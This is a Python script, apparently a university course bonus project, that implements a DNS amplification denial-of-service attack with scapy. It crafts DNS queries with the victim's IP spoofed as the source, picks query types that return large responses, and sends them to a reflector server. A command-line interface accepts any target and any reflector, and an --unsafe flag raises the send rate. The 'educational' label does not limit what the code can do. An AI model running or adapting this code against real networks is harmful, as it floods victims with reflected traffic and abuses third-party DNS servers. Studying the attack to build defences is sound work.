#!/usr/bin/env python3
"""
SecureNet DC - DNS Amplification Attack Simulator
CPEG 460 Bonus Project

Simulates DNS amplification attack for educational purposes.
This attack uses DNS servers as reflectors to amplify traffic
towards the target using spoofed source IPs.

WARNING: For educational use only in controlled environments.
"""

from scapy.all import IP, UDP, DNS, DNSQR, send
import time
import random
import logging

logger = logging.getLogger(__name__)


class DNSAmplification:
    """
    DNS Amplification Attack Simulator.

    Sends DNS queries with spoofed source IP (the victim's IP)
    to DNS servers, causing amplified responses to be sent to
    the victim.

    Note: In this simulation, we send to a local "DNS server"
    to demonstrate the concept without actually attacking real
    infrastructure.
    """

    def __init__(self, target_ip, dns_server='10.0.1.2', safe_mode=True):
        """
        Initialize DNS Amplification attack.

        Args:
            target_ip: Target (victim) IP address
            dns_server: DNS server to use as reflector
            safe_mode: Limit attack intensity (default: True)
        """
        self.target_ip = target_ip
        self.dns_server = dns_server
        self.safe_mode = safe_mode
        self.running = False
        self.packets_sent = 0
        self.max_pps = 50 if safe_mode else 500

        # Common DNS query types that produce large responses
        self.query_types = ['ANY', 'TXT', 'MX', 'AAAA']
        self.domains = [
            'google.com', 'facebook.com', 'twitter.com',
            'amazon.com', 'microsoft.com', 'apple.com'
        ]

        logger.info(f"DNS Amplification initialized: target={target_ip}, "
                   f"reflector={dns_server}")

    def craft_packet(self, query_type='ANY', domain=None):
        """
        Craft a DNS query packet with spoofed source.

        Args:
            query_type: DNS query type (ANY, TXT, etc.)
            domain: Domain to query

        Returns:
            Scapy packet object
        """
        if domain is None:
            domain = random.choice(self.domains)

        # IP layer with spoofed source (victim's IP)
        ip_layer = IP(
            src=self.target_ip,  # Spoofed source (victim)
            dst=self.dns_server   # DNS server (reflector)
        )

        # UDP layer for DNS
        udp_layer = UDP(
            sport=random.randint(1024, 65535),
            dport=53
        )

        # DNS query layer
        # Query type mapping
        qtype_map = {
            'ANY': 255,
            'A': 1,
            'AAAA': 28,
            'MX': 15,
            'TXT': 16,
            'NS': 2
        }

        dns_layer = DNS(
            id=random.randint(0, 65535),
            qr=0,  # Query
            opcode=0,  # Standard query
            rd=1,  # Recursion desired
            qd=DNSQR(
                qname=domain,
                qtype=qtype_map.get(query_type, 255)
            )
        )

        return ip_layer / udp_layer / dns_layer

    def start(self, duration=30, pps=None, callback=None):
        """
        Start the DNS amplification attack.

        Args:
            duration: Attack duration in seconds
            pps: Packets per second
            callback: Progress callback function

        Returns:
            dict: Attack statistics
        """
        if pps is None:
            pps = self.max_pps
        elif self.safe_mode and pps > self.max_pps:
            pps = self.max_pps
            logger.warning(f"Safe mode: PPS limited to {self.max_pps}")

        self.running = True
        self.packets_sent = 0
        start_time = time.time()
        interval = 1.0 / pps

        logger.warning(f"[!] Starting DNS Amplification")
        logger.warning(f"[!] Target (victim): {self.target_ip}")
        logger.warning(f"[!] Reflector: {self.dns_server}")
        logger.warning(f"[!] Duration: {duration}s, PPS: {pps}")

        try:
            while self.running and (time.time() - start_time) < duration:
                # Craft and send packet
                query_type = random.choice(self.query_types)
                pkt = self.craft_packet(query_type=query_type)
                send(pkt, verbose=0)
                self.packets_sent += 1

                # Progress callback
                if callback and self.packets_sent % 50 == 0:
                    elapsed = time.time() - start_time
                    # Estimate amplification (typical DNS amplification is 28-54x)
                    estimated_amplification = 30
                    callback({
                        'packets_sent': self.packets_sent,
                        'elapsed': elapsed,
                        'rate': self.packets_sent / elapsed if elapsed > 0 else 0,
                        'estimated_amplified_packets': self.packets_sent,
                        'amplification_factor': estimated_amplification
                    })

                # Rate limiting
                time.sleep(interval)

        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
        finally:
            self.running = False

        elapsed = time.time() - start_time
        estimated_amplification = 30  # Typical DNS amplification factor

        stats = {
            'attack_type': 'DNS_AMPLIFICATION',
            'target': self.target_ip,
            'reflector': self.dns_server,
            'duration': elapsed,
            'queries_sent': self.packets_sent,
            'average_pps': self.packets_sent / elapsed if elapsed > 0 else 0,
            'estimated_amplification': estimated_amplification,
            'estimated_amplified_traffic': f"{self.packets_sent * estimated_amplification * 512 / 1024:.1f} KB"
        }

        logger.info(f"[+] Attack complete: {self.packets_sent} queries sent")
        logger.info(f"[+] Estimated amplification: {estimated_amplification}x")
        return stats

    def stop(self):
        """Stop the attack."""
        self.running = False
        logger.info("DNS Amplification stopped")


def main():
    """Command-line interface for DNS amplification."""
    import argparse

    parser = argparse.ArgumentParser(
        description='DNS Amplification Attack Simulator (Educational)'
    )
    parser.add_argument('target', help='Target (victim) IP address')
    parser.add_argument('-s', '--server', default='10.0.1.2',
                       help='DNS server to use as reflector')
    parser.add_argument('-d', '--duration', type=int, default=30,
                       help='Duration in seconds (default: 30)')
    parser.add_argument('-r', '--rate', type=int, default=50,
                       help='Packets per second (default: 50)')
    parser.add_argument('--unsafe', action='store_true',
                       help='Disable safe mode')

    args = parser.parse_args()

    attack = DNSAmplification(args.target, args.server, safe_mode=not args.unsafe)
    attack.start(duration=args.duration, pps=args.rate)


if __name__ == '__main__':
    main()
